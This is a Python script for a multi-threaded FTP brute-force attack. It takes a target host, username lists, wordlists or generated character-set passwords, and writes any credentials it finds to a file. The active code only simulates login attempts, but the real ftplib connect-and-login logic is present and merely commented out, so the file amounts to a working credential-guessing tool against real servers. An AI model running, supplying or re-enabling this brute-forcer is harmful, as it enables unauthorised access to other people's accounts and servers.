import ftplib
import threading
import queue
import time
import argparse # For command-line arguments
import itertools # For password generation
import string # For character sets in password generation
from colorama import init, Fore

# Initialize Colorama for colored output
init()

# Global variable to signal if credentials are found
found_credentials = threading.Event()

# Queue to hold username-password combinations
combo_queue = queue.Queue()

# Store found credentials
found_creds_file = "found_credentials.txt"

def load_lines(filepath):
    """
    Loads lines from a given file into a list.
    """
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Error: File not found - {filepath}{Fore.RESET}")
        return []

def generate_passwords(chars, min_length, max_length):
    """
    Generates passwords dynamically based on character set and length range.
    Uses itertools.product for combinations.
    """
    for length in range(min_length, max_length + 1):
        for combo in itertools.product(chars, repeat=length):
            yield "".join(combo)

def connect_ftp(host, port, user, password):
    """
    Attempts to connect to the FTP server with the given credentials.
    Includes retry mechanism and TEMPORARY SIMULATION.
    """
    if found_credentials.is_set():
        return # Stop if credentials already found

    max_retries = 3
    for attempt in range(max_retries):
        try:
            # --- SIMULATION PART STARTS HERE ---
            # Define a "correct" username-password pair for simulation
            simulated_correct_user = "testuser"
            simulated_correct_password = "testpass"

            print(f"[*] Simulating attempt: {user}:{password} on {host}:{port}")
            time.sleep(0.1) # Simulate network delay

            if user == simulated_correct_user and password == simulated_correct_password:
                print(f"{Fore.GREEN}[+] Found Credentials: {user}:{password} (SIMULATED SUCCESS){Fore.RESET}")
                found_credentials.set() # Signal that credentials have been found
                # Save to file
                with open(found_creds_file, 'a') as f:
                    f.write(f"{user}:{password}\n")
                return True # Indicate success
            else:
                # Simulate a temporary error for retry demonstration
                if attempt < max_retries - 1 and (password == "retryme" or user == "tempfail"):
                    print(f"{Fore.YELLOW}[*] Simulated temporary failure: {user}:{password}. Retrying... ({attempt + 1}/{max_retries}){Fore.RESET}")
                    time.sleep(0.5) # Wait before retry
                    continue # Try again
                else:
                    print(f"{Fore.RED}[-] Failed: {user}:{password} (SIMULATED FAILURE){Fore.RESET}")
                    return False # Indicate failure
            # --- SIMULATION PART ENDS HERE ---

            # Original FTP connection logic (commented out for simulation)
            # with ftplib.FTP() as server:
            #     server.connect(host, port, timeout=5)
            #     server.login(user, password)
            #     print(f"{Fore.GREEN}[+] Found Credentials: {user}:{password}{Fore.RESET}")
            #     found_credentials.set()
            #     with open(found_creds_file, 'a') as f:
            #         f.write(f"{user}:{password}\n")
            #     return True
        except ftplib.error_perm as e:
            # Permanent FTP error (e.g., login failure)
            print(f"{Fore.RED}[-] Failed: {user}:{password} (FTP Error: {e}){Fore.RESET}")
            return False # No need to retry for permanent error
        except (ftplib.all_errors, ConnectionRefusedError, TimeoutError) as e:
            # Network or temporary FTP errors
            if attempt < max_retries - 1:
                print(f"{Fore.YELLOW}[*] Connection error for {host}:{port} ({e}). Retrying... ({attempt + 1}/{max_retries}){Fore.RESET}")
                time.sleep(1 + attempt) # Exponential backoff
            else:
                print(f"{Fore.RED}[-] Failed: {user}:{password} (Max retries reached for connection error: {e}){Fore.RESET}")
                return False
        except Exception as e:
            print(f"{Fore.RED}[-] Unexpected error: {e}{Fore.RESET}")
            return False
    return False # Should not reach here if loop finishes without returning

def worker(host, port):
    """
    Worker thread function to process username-password combinations from the queue.
    """
    while not found_credentials.is_set():
        try:
            user, password = combo_queue.get(timeout=1) # Get with timeout to allow graceful exit
        except queue.Empty:
            break # Queue is empty, exit thread

        connect_ftp(host, port, user, password)
        combo_queue.task_done()

def main():
    """
    Main function to parse arguments, prepare data, and run the advanced FTP brute-forcer.
    """
    parser = argparse.ArgumentParser(description="Advanced FTP Brute-Force Tool")
    parser.add_argument("-H", "--host", required=True, help="Target FTP host")
    parser.add_argument("-P", "--port", type=int, default=21, help="Target FTP port (default: 21)")
    parser.add_argument("-U", "--userlist", help="Path to a file containing usernames")
    parser.add_argument("-u", "--username", help="Single username to test (overrides userlist)")
    parser.add_argument("-W", "--wordlist", help="Path to a file containing passwords")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-C", "--chars", help="Characters for password generation (e.g., 'abc123')")
    parser.add_argument("-l", "--min-len", type=int, help="Minimum length for generated passwords")
    parser.add_argument("-L", "--max-len", type=int, help="Maximum length for generated passwords")
    parser.add_argument("--save-file", default="found_credentials.txt", help="File to save found credentials (default: found_credentials.txt)")

    args = parser.parse_args()

    global found_creds_file
    found_creds_file = args.save_file

    # Determine usernames
    users = []
    if args.username:
        users = [args.username]
    elif args.userlist:
        users = load_lines(args.userlist)
    else:
        print(f"{Fore.RED}Error: Either --username or --userlist must be provided.{Fore.RESET}")
        return

    if not users:
        print(f"{Fore.RED}No usernames to test. Exiting.{Fore.RESET}")
        return

    # Determine passwords
    passwords_iter = []
    if args.wordlist:
        passwords_iter = load_lines(args.wordlist)
    elif args.chars and args.min_len is not None and args.max_len is not None:
        print(f"{Fore.CYAN}Generating passwords from '{args.chars}' with length {args.min_len}-{args.max_len}...{Fore.RESET}")
        passwords_iter = generate_passwords(args.chars, args.min_len, args.max_len)
    else:
        print(f"{Fore.RED}Error: Either --wordlist or (--chars, --min-len, --max-len) must be provided.{Fore.RESET}")
        return

    print(f"{Fore.CYAN}Starting Advanced FTP Brute-Force (SIMULATED) on {args.host}:{args.port} with {len(users)} users and passwords...{Fore.RESET}")

    # Populate the queue with all user-password combinations
    # For generated passwords, we iterate as a generator
    if isinstance(passwords_iter, list): # If it's a loaded wordlist
        for user in users:
            for password in passwords_iter:
                combo_queue.put((user, password))
    else: # If it's a generator (from generate_passwords)
        # Need to be careful with large generators and putting all into queue at once
        # For this example, we'll consume the generator. For very large sets,
        # a more advanced producer-consumer pattern would be needed.
        generated_passwords_list = list(passwords_iter) # Consume the generator
        for user in users:
            for password in generated_passwords_list:
                combo_queue.put((user, password))


    if combo_queue.empty():
        print(f"{Fore.YELLOW}No combinations to test. Please check user/password sources. Exiting.{Fore.RESET}")
        return

    threads = []
    for _ in range(args.threads):
        thread = threading.Thread(target=worker, args=(args.host, args.port), daemon=True)
        threads.append(thread)
        thread.start()

    combo_queue.join() # Wait for all tasks in the queue to be done

    if not found_credentials.is_set():
        print(f"{Fore.YELLOW}No credentials found (SIMULATED) after all attempts.{Fore.RESET}")
    print(f"{Fore.CYAN}Advanced FTP Brute-Force (SIMULATED) finished.{Fore.RESET}")

if __name__ == "__main__":
    main()